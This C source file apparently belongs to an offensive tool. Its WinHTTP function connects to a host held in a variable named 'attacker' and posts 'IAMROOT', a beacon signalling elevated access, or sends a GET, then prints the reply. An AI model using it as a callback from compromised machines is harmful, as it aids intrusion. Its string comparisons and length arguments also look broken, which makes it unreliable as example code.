#include "WINHTTP.h"

int winhttp(const char* ip, const char* method)
{
	//Convert const char* to LPCWSTR
	WCHAR attacker[100];
	MultiByteToWideChar(CP_ACP, 0, ip, -1, attacker, 100);
	LPCWSTR server = attacker;

	LPCWSTR ext = L"/";
	LPCWSTR postdata = L"IAMROOT                                                    ";

	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

	printf("Go HTTP! \n\n");

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);

	// Create an HTTP Request handle.
	if (hConnect)
		if (hConnect && method == "GET")
			hRequest = WinHttpOpenRequest(hConnect, L"GET", 0, ext, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
		else
			hRequest = WinHttpOpenRequest(hConnect, L"POST", 0, ext, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	// Send a Request.
	if (hRequest)
		if (hConnect && method == "GET")
			bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
		else
			bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postdata, wcslen(postdata), wcslen(postdata), 0);

	// Check for errors.
	if (bResults)
	{
		if (WinHttpReceiveResponse(hRequest, NULL))
		{
			DWORD dwDownloaded, dwSize;
			do
			{
				if (!WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize)
					break;
				char* buf = malloc(dwSize);
				if (!buf)
					break;
				WinHttpReadData(hRequest, (LPVOID)buf, dwSize, &dwDownloaded);
				fwrite(buf, sizeof(char), dwSize, stdout);
				free(buf);
				if (!dwDownloaded)
					break;
			} while (dwSize > 0);
		}
	}
	else
		printf("Error %d has occurred.\n", GetLastError());

	if (hRequest)
		WinHttpCloseHandle(hRequest);
	if (hConnect)
		WinHttpCloseHandle(hConnect);
	if (hSession)
		WinHttpCloseHandle(hSession);

	return 0;
}